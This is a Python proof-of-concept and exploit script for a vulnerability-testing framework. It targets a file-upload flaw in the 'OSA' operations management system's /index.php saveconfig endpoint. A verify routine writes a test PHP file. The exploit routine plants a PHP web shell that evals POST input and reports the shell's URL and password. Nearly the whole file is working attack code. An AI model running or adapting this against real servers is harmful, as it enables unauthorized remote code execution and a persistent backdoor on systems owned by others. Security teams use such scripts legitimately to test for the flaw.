#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0058',
            'name': 'OSA运维管理系统前台 /index.php GETSHELL POC & Exploit',
            'author': '雷蜂',
            'create_date': '2014-10-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'OSA',
            'vul_version': ['*'],
            'type': 'File Upload',
            'tag': ['OSA漏洞', 'GETSHELL'],
            'desc': 'N/A',
            'references': ['https://www.t00ls.net/thread-28079-1-1.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        # Getshell
        verify_url = args['options']['target'] + '/index.php?c=maintain&a=saveconfig&id=1'
        post_one_content = 'ctext[1]=<?php echo md5(321123);?>&cfilename=./data/tmp.php&buddysubmit=buddysubmit'
        req = urllib2.Request(verify_url, post_one_content)
        if args['options']['verbose']:
            print '[*] Request Getshell_URL: ' + verify_url
            print '[*] Post content: ' + post_one_content
        response = urllib2.urlopen(req)
        # To determine whether there
        shell_url = args['options']['target'] + './data/tmp.php'
        shell_content = urllib2.urlopen(shell_url).read()
        if '150920ccedc34d24031cdd3711e43310' in shell_content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['test_file'] = shell_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        # Getshell
        verify_url = args['options']['target'] + '/index.php?c=maintain&a=saveconfig&id=1'
        post_one_content = ('ctext[1]=<?php echo md5(321123); eval($_POST["test"]); ?>&'
                            'cfilename=./data/bb2.php&buddysubmit=buddysubmit')
        req = urllib2.Request(verify_url, post_one_content)
        if args['options']['verbose']:
            print '[*] Request Getshell_URL: ' + verify_url
            print '[*] Post content: ' + post_one_content
        response = urllib2.urlopen(req)
        # To determine whether there
        shell_url = args['options']['target'] + './data/bb2.php'
        shell_content = urllib2.urlopen(shell_url).read()
        if '150920ccedc34d24031cdd3711e43310' in shell_content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['webshell'] = shell_url
            args['poc_ret']['password'] = 'test'
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
